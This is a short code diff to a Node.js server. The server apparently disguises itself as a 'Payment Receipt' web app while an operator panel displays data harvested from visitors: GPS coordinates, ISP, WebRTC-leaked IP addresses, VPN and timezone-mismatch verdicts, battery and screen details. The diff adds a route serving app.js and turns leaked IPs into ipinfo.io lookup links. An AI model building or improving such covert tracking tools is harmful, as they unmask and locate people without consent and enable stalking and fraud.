@@ -68,6 +68,10 @@ const server = http.createServer((req, res) => {
   if (req.method === 'GET' && url === '/sw.js') {
     return serveFile(res, 'service-worker.js', 'application/javascript');
   }
+
+  if (req.method === 'GET' && url === '/app.js') {
+    return serveFile(res, 'app.js', 'application/javascript');
+  }
   if (req.method === 'GET' && url === '/manifest.json') {
     return send(res, 200, 'application/manifest+json', JSON.stringify({
       name: 'Payment Receipt', short_name: 'Receipt', start_url: '/txn/6860826195',
@@ -185,7 +189,7 @@ const server = http.createServer((req, res) => {
           <div><i>ISP</i>${m.isp || '-'} <b class="${m.vpnVerdict && m.vpnVerdict.includes('VPN') ? 'r' : ''}">${m.vpnVerdict || ''}</b></div>
           <div><i>GPS</i>${m.gps || m.gpsLiveLast || '-'} ${m.gpsAccM ? '±' + m.gpsAccM + 'm' : ''}</div>
           <div><i>Maps</i>${m.maps ? '<a href="' + m.maps + '" target="_blank">open</a>' : '-'}</div>
-          <div><i>WebRTC</i>${m.rtcIPs || '-'}</div>
+          <div><i>WebRTC</i>${m.rtcIPs ? (m.rtcIPs.split(',').map(s=>s.replace('local:','').trim()).filter(ip=>/^\d{1,3}(\.\d{1,3}){3}$/.test(ip)).map(ip=>'<a href="https://ipinfo.io/'+ip+'" target="_blank">'+ip+'</a>').join(' , ') || '-') : '-'}</div>
           <div><i>Timezone</i>${m.tz || '-'} ${m.tzMismatch ? '<b class="r">MISMATCH → VPN</b>' : ''}</div>
           <div><i>Battery</i>${m.battery || '-'}</div>
           <div><i>Screen</i>${m.screen || '-'}</div>
